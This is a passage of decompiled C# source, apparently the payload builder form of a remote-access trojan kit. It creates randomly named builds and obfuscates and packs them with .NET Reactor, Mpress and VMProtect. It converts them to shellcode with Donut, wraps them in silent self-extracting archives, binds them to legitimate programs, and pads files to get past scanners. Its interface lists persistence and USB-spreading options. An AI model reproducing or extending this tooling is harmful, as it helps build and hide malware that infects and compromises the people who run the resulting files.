			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, reactorSuccess ? ".NET Reactor protection" : "no protection");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in BuildReactor_Click: " + ex2.Message, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool ApplyNetReactor(string filePath)
	{
		try
		{
			string reactorPath = Path.Combine(Application.StartupPath, "Stub", "dotNET_Reactor.Console.exe");
			if (!File.Exists(reactorPath))
			{
				MessageBox.Show("dotNET_Reactor.Console.exe not found at: " + reactorPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(filePath))
			{
				MessageBox.Show("Input file not found: " + filePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			string outputFile = Path.Combine(Path.GetDirectoryName(filePath), Path.GetFileNameWithoutExtension(filePath) + "_reactor" + Path.GetExtension(filePath));
			Process process = Process.Start(new ProcessStartInfo
			{
				FileName = reactorPath,
				Arguments = $"-file \"{filePath}\" -targetfile \"{outputFile}\" -necrobit 1 -anti_tamper 1 -control_flow_obfuscation 1 -flow_level 9 -resourceencryption 1 -stringencryption 1 -antidecompiler 1 -obfuscation 1 -suppressildasm 1 -hide_calls 1 -virtualization 1",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				WorkingDirectory = Path.GetDirectoryName(reactorPath)
			});
			if (process != null)
			{
				process.WaitForExit();
				Thread.Sleep(1000);
				if (File.Exists(outputFile))
				{
					try
					{
						if (File.Exists(filePath))
						{
							File.Delete(filePath);
						}
						File.Move(outputFile, filePath);
						return true;
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error replacing file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						return false;
					}
				}
				MessageBox.Show(".NET Reactor did not create output file.\n\nExpected: " + outputFile, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			MessageBox.Show("Failed to start .NET Reactor process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Error applying .NET Reactor: " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void BuildMpress_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool mpressSuccess = false;
			try
			{
				mpressSuccess = ApplyMpress(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyMpress: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!mpressSuccess)
			{
				MessageBox.Show("Mpress failed! Build created without compression.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, mpressSuccess ? "Mpress compression" : "no compression");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in BuildMpress_Click: " + ex2.Message, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool ApplyMpress(string filePath)
	{
		try
		{
			string mpressPath = Path.Combine(Application.StartupPath, "Stub", "mpress.exe");
			if (!File.Exists(mpressPath))
			{
				MessageBox.Show("mpress.exe not found at: " + mpressPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(filePath))
			{
				MessageBox.Show("Input file not found: " + filePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			Process process = Process.Start(new ProcessStartInfo
			{
				FileName = mpressPath,
				Arguments = $"-s \"{filePath}\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				WorkingDirectory = Path.GetDirectoryName(mpressPath)
			});
			if (process != null)
			{
				process.WaitForExit();
				Thread.Sleep(500);
				if (process.ExitCode == 0)
				{
					return true;
				}
				MessageBox.Show("Mpress failed with exit code: " + process.ExitCode, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			MessageBox.Show("Failed to start Mpress process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
		catch (Exception ex)
		{
			MessageBox.Show("Error applying Mpress: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void BuildDonut_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Shellcode (*.bin)|*.bin|All files (*.*)|*.*";
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".bin";
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string shellcodePath = saveFileDialog.FileName;
			if (!shellcodePath.EndsWith(".bin", StringComparison.OrdinalIgnoreCase))
			{
				shellcodePath = Path.ChangeExtension(shellcodePath, "bin");
			}
			string tempExePath = Path.Combine(Path.GetTempPath(), "donut_temp_" + Randomizer.getRandomCharactersAscii(8) + ".exe");
			try
			{
				CreateBulid(tempExePath);
				GC.Collect();
				GC.WaitForPendingFinalizers();
				GC.Collect();
				Thread.Sleep(1000);
				if (!File.Exists(tempExePath))
				{
					MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				bool donutSuccess = false;
				try
				{
					donutSuccess = ApplyDonut(tempExePath, shellcodePath);
				}
				catch (Exception ex)
				{
					MessageBox.Show("Exception in ApplyDonut: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				finally
				{
					try
					{
						if (File.Exists(tempExePath))
						{
							File.Delete(tempExePath);
						}
					}
					catch
					{
					}
				}
				if (donutSuccess)
				{
					MessageBox.Show("Shellcode created successfully!\n\nOutput: " + Path.GetFileName(shellcodePath), "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					MessageBox.Show("Donut failed to create shellcode!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Exception during build: " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Critical exception in BuildDonut_Click: " + ex3.Message, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool ApplyDonut(string exePath, string outputPath)
	{
		try
		{
			string donutPath = Path.Combine(Application.StartupPath, "Stub", "Donut", "donut.exe");
			if (!File.Exists(donutPath))
			{
				MessageBox.Show("donut.exe not found at: " + donutPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(exePath))
			{
				MessageBox.Show("Input file not found: " + exePath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			Process process = Process.Start(new ProcessStartInfo
			{
				FileName = donutPath,
				Arguments = $"\"{exePath}\"",
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				RedirectStandardError = true,
				WorkingDirectory = Path.GetDirectoryName(donutPath)
			});
			if (process != null)
			{
				string output = process.StandardOutput.ReadToEnd();
				string error = process.StandardError.ReadToEnd();
				process.WaitForExit();
				Thread.Sleep(500);
				string autoOutputPath = exePath + ".bin";
				if (File.Exists(autoOutputPath))
				{
					try
					{
						if (File.Exists(outputPath))
						{
							File.Delete(outputPath);
						}
						File.Move(autoOutputPath, outputPath);
						return true;
					}
					catch (Exception ex)
					{
						MessageBox.Show("Error moving output file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
						return false;
					}
				}
				string errorMsg = "Donut did not create output file.\n\nExpected: " + autoOutputPath;
				if (!string.IsNullOrEmpty(error))
				{
					errorMsg = errorMsg + "\n\nError: " + error;
				}
				if (!string.IsNullOrEmpty(output))
				{
					errorMsg = errorMsg + "\n\nOutput: " + output;
				}
				MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			MessageBox.Show("Failed to start Donut process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Error applying Donut: " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void BuildSFX_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = "Executable (*.exe)|*.exe";
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + ".exe";
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string sfxPath = saveFileDialog.FileName;
			if (!sfxPath.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
			{
				sfxPath = Path.ChangeExtension(sfxPath, "exe");
			}
			string tempBuildPath = Path.Combine(Path.GetTempPath(), "sfx_build_" + Randomizer.getRandomCharactersAscii(8) + ".exe");
			try
			{
				CreateBulid(tempBuildPath);
				GC.Collect();
				GC.WaitForPendingFinalizers();
				GC.Collect();
				Thread.Sleep(1000);
				if (!File.Exists(tempBuildPath))
				{
					MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				bool sfxSuccess = false;
				try
				{
					sfxSuccess = CreateSFXArchive(tempBuildPath, sfxPath);
				}
				catch (Exception ex)
				{
					MessageBox.Show("Exception in CreateSFXArchive: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return;
				}
				finally
				{
					try
					{
						if (File.Exists(tempBuildPath))
						{
							File.Delete(tempBuildPath);
						}
					}
					catch
					{
					}
				}
				if (sfxSuccess)
				{
					MessageBox.Show("SFX archive created successfully!\n\nOutput: " + Path.GetFileName(sfxPath), "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					MessageBox.Show("Failed to create SFX archive!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Exception during build: " + ex2.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Critical exception in BuildSFX_Click: " + ex3.Message, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private bool CreateSFXArchive(string buildPath, string outputPath)
	{
		try
		{
			string rarPath = null;
			string[] array = new string[4]
			{
				Path.Combine(Application.StartupPath, "rar.exe"),
				"C:\\Program Files\\WinRAR\\rar.exe",
				"C:\\Program Files (x86)\\WinRAR\\rar.exe",
				"rar.exe"
			};
			foreach (string path in array)
			{
				if (File.Exists(path))
				{
					rarPath = path;
					break;
				}
			}
			if (rarPath == null)
			{
				MessageBox.Show("WinRAR not found! Please install WinRAR to use SFX feature.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			if (!File.Exists(buildPath))
			{
				MessageBox.Show("Build file not found: " + buildPath, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			string buildFileName = Path.GetFileName(buildPath);
			string directory = Path.GetDirectoryName(buildPath);
			string originalDir = Directory.GetCurrentDirectory();
			Directory.SetCurrentDirectory(directory);
			try
			{
				string setupConfig = $"Setup={buildFileName}\r\nSilent=1\r\nOverwrite=1";
				string configPath = Path.Combine(Path.GetTempPath(), "sfx_config_" + Randomizer.getRandomCharactersAscii(8) + ".txt");
				File.WriteAllText(configPath, setupConfig);
				Process process = Process.Start(new ProcessStartInfo
				{
					FileName = rarPath,
					Arguments = $"a -sfx -ep -z\"{configPath}\" \"{outputPath}\" \"{buildFileName}\"",
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					UseShellExecute = false,
					RedirectStandardOutput = true,
					RedirectStandardError = true,
					WorkingDirectory = directory
				});
				if (process != null)
				{
					string output = process.StandardOutput.ReadToEnd();
					string error = process.StandardError.ReadToEnd();
					process.WaitForExit();
					Thread.Sleep(1000);
					try
					{
						if (File.Exists(configPath))
						{
							File.Delete(configPath);
						}
					}
					catch
					{
					}
					if (File.Exists(outputPath))
					{
						return true;
					}
					string errorMsg = "WinRAR did not create SFX file.\n\nExpected: " + outputPath;
					if (!string.IsNullOrEmpty(error))
					{
						errorMsg = errorMsg + "\n\nError: " + error;
					}
					if (!string.IsNullOrEmpty(output))
					{
						errorMsg = errorMsg + "\n\nOutput: " + output;
					}
					MessageBox.Show(errorMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
					return false;
				}
				MessageBox.Show("Failed to start WinRAR process.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return false;
			}
			finally
			{
				Directory.SetCurrentDirectory(originalDir);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Error in CreateSFXArchive: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			return false;
		}
	}

	private void HandlePostBuildOperations(string finalPath, string buildType)
	{
		try
		{
			if (checkBox11.Checked && checkBox14.Checked && !string.IsNullOrWhiteSpace(rjTextBox13.Texts) && int.TryParse(rjTextBox13.Texts, out var pumpSize) && pumpSize > 0)
			{
				string sizeUnit = rjComboBox5.Texts;
				PumpFile(finalPath, pumpSize, sizeUnit);
			}
			if (checkBox11.Checked)
			{
				string archiveType = rjComboBox4.Texts;
				string archiveName = rjTextBox10.Texts;
				string password = (checkBox12.Checked ? rjTextBox11.Texts : null);
				string buildName = (checkBox13.Checked ? rjTextBox12.Texts : null);
				string archivePath = CreateArchive(finalPath, archiveType, archiveName, password, buildName);
				if (archivePath != null)
				{
					MessageBox.Show("Build created with " + buildType + " and archived successfully!\nArchive: " + Path.GetFileName(archivePath));
					SaveBuildRecord(Path.GetFileName(archivePath), archivePath);
				}
				else
				{
					MessageBox.Show("Build created with " + buildType + " but archiving failed!");
					SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
				}
			}
			else
			{
				MessageBox.Show("Build Create!");
				SaveBuildRecord(Path.GetFileName(finalPath), finalPath);
			}
		}
		catch (Exception ex)
		{
			MessageBox.Show("Exception in HandlePostBuildOperations: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton16_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, "VMP");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in rjButton16_Click: " + ex2.Message + "\n\n" + ex2.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton18_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Choose program";
			openFileDialog.Filter = "Files(*.exe)|*.exe";
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			BulidJoin(openFileDialog.FileName, finalPath);
			string joinerPath = Path.Combine(Path.GetDirectoryName(finalPath), Path.GetFileName(openFileDialog.FileName));
			if (File.Exists(joinerPath) && joinerPath != finalPath)
			{
				if (File.Exists(finalPath))
				{
					File.Delete(finalPath);
				}
				File.Move(joinerPath, finalPath);
			}
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without VMP protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, "Join + VMP");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in rjButton18_Click: " + ex2.Message + "\n\n" + ex2.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton19_Click(object sender, EventArgs e)
	{
		try
		{
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			BulidDropper(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without VMP protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, "Dropper + VMP");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in rjButton19_Click: " + ex2.Message + "\n\n" + ex2.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton20_Click(object sender, EventArgs e)
	{
		try
		{
			using OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Choose program";
			openFileDialog.Filter = "Files(*.exe)|*.exe";
			openFileDialog.Multiselect = false;
			if (openFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			BulidDropper(finalPath);
			BulidJoin(openFileDialog.FileName, finalPath);
			string joinerPath = Path.Combine(Path.GetDirectoryName(finalPath), Path.GetFileName(openFileDialog.FileName));
			if (File.Exists(joinerPath) && joinerPath != finalPath)
			{
				if (File.Exists(finalPath))
				{
					File.Delete(finalPath);
				}
				File.Move(joinerPath, finalPath);
			}
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex.Message + "\n\n" + ex.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without VMP protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, "Dropper + Join + VMP");
		}
		catch (Exception ex2)
		{
			MessageBox.Show("Critical exception in rjButton20_Click: " + ex2.Message + "\n\n" + ex2.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	private void rjButton21_Click(object sender, EventArgs e)
	{
		try
		{
			using FormPumpSettings formPump = new FormPumpSettings();
			formPump.ShowDialog(this);
			if (!formPump.PumpSizeBytes.HasValue)
			{
				return;
			}
			long pumpBytes = formPump.PumpSizeBytes.Value;
			using SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Filter = GetFileFilter();
			saveFileDialog.InitialDirectory = Path.Combine(Application.StartupPath, "Bulids");
			saveFileDialog.OverwritePrompt = false;
			string extension = GetSelectedExtension();
			saveFileDialog.FileName = Randomizer.getRandomCharactersAscii(16) + extension;
			if (saveFileDialog.ShowDialog() != DialogResult.OK)
			{
				return;
			}
			string finalPath = saveFileDialog.FileName;
			if (!finalPath.EndsWith(extension, StringComparison.OrdinalIgnoreCase))
			{
				finalPath = Path.ChangeExtension(finalPath, extension.Substring(1));
			}
			CreateBulid(finalPath);
			BulidDropper(finalPath);
			GC.Collect();
			GC.WaitForPendingFinalizers();
			GC.Collect();
			Thread.Sleep(1000);
			if (!File.Exists(finalPath))
			{
				MessageBox.Show("Build file was not created successfully!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			try
			{
				long currentSize = new FileInfo(finalPath).Length;
				long targetSize = pumpBytes;
				if (targetSize > currentSize)
				{
					long bytesToAdd = targetSize - currentSize;
					using FileStream fs = new FileStream(finalPath, FileMode.Append);
					byte[] buffer = new byte[8192];
					Random rnd = new Random();
					int toWrite;
					for (long written = 0L; written < bytesToAdd; written += toWrite)
					{
						toWrite = (int)Math.Min(buffer.Length, bytesToAdd - written);
						rnd.NextBytes(buffer);
						fs.Write(buffer, 0, toWrite);
					}
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Exception in Pump: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
			}
			bool vmpSuccess = false;
			try
			{
				vmpSuccess = ApplyVMProtection(finalPath);
			}
			catch (Exception ex2)
			{
				MessageBox.Show("Exception in ApplyVMProtection: " + ex2.Message + "\n\n" + ex2.StackTrace, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			if (!vmpSuccess)
			{
				MessageBox.Show("VMProtect failed! Build created without VMP protection.", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			}
			Thread.Sleep(500);
			HandlePostBuildOperations(finalPath, "Dropper + Pump + VMP");
		}
		catch (Exception ex3)
		{
			MessageBox.Show("Critical exception in rjButton21_Click: " + ex3.Message + "\n\n" + ex3.StackTrace, "Critical Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
		System.ComponentModel.ComponentResourceManager componentResourceManager = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormBulider));
		new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormBulider));
		this.materialTabControl1 = new MaterialSkin.Controls.MaterialTabControl();
		this.tabPage1 = new System.Windows.Forms.TabPage();
		this.rjButton15 = new CustomControls.RJControls.RJButton();
		this.rjButton14 = new CustomControls.RJControls.RJButton();
		this.rjButton13 = new CustomControls.RJControls.RJButton();
		this.rjButton12 = new CustomControls.RJControls.RJButton();
		this.rjButton11 = new CustomControls.RJControls.RJButton();
		this.rjButton4 = new CustomControls.RJControls.RJButton();
		this.rjTextBox6 = new CustomControls.RJControls.RJTextBox();
		this.rjTextBox7 = new CustomControls.RJControls.RJTextBox();
		this.rjButton2 = new CustomControls.RJControls.RJButton();
		this.rjTextBox1 = new CustomControls.RJControls.RJTextBox();
		this.rjButton1 = new CustomControls.RJControls.RJButton();
		this.GridIps = new System.Windows.Forms.DataGridView();
		this.Column1 = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.rjTextBox8 = new CustomControls.RJControls.RJTextBox();
		this.checkBox3 = new System.Windows.Forms.CheckBox();
		this.tabPage2 = new System.Windows.Forms.TabPage();
		this.panel1 = new System.Windows.Forms.Panel();
		this.checkBoxWinlogonShell = new System.Windows.Forms.CheckBox();
		this.checkBoxReserved = new System.Windows.Forms.CheckBox();
		this.rjTextBoxReserved = new CustomControls.RJControls.RJTextBox();
		this.checkBoxWMIStartup = new System.Windows.Forms.CheckBox();
		this.rjTextBoxWMIStartup = new CustomControls.RJControls.RJTextBox();
		this.checkBoxUSBSpread = new System.Windows.Forms.CheckBox();
		this.rjTextBoxUSBSpread = new CustomControls.RJControls.RJTextBox();
		this.checkBoxWindowsService = new System.Windows.Forms.CheckBox();
		this.rjTextBoxWindowsService = new CustomControls.RJControls.RJTextBox();
		this.checkBoxProcessCritical = new System.Windows.Forms.CheckBox();
		this.rjTextBoxProcessCritical = new CustomControls.RJControls.RJTextBox();
		this.checkBoxCmdlineAutorun = new System.Windows.Forms.CheckBox();
		this.rjComboBoxCmdlineDir = new CustomControls.RJControls.RJComboBox();
		this.rjTextBoxCmdlineProcess = new CustomControls.RJControls.RJTextBox();
		this.checkBox7 = new System.Windows.Forms.CheckBox();
		this.checkBox9 = new System.Windows.Forms.CheckBox();
		this.checkBox8 = new System.Windows.Forms.CheckBox();
		this.rjTextBox5 = new CustomControls.RJControls.RJTextBox();
		this.checkBox6 = new System.Windows.Forms.CheckBox();
		this.rjComboBox2 = new CustomControls.RJControls.RJComboBox();
		this.rjTextBox4 = new CustomControls.RJControls.RJTextBox();
		this.checkBox5 = new System.Windows.Forms.CheckBox();
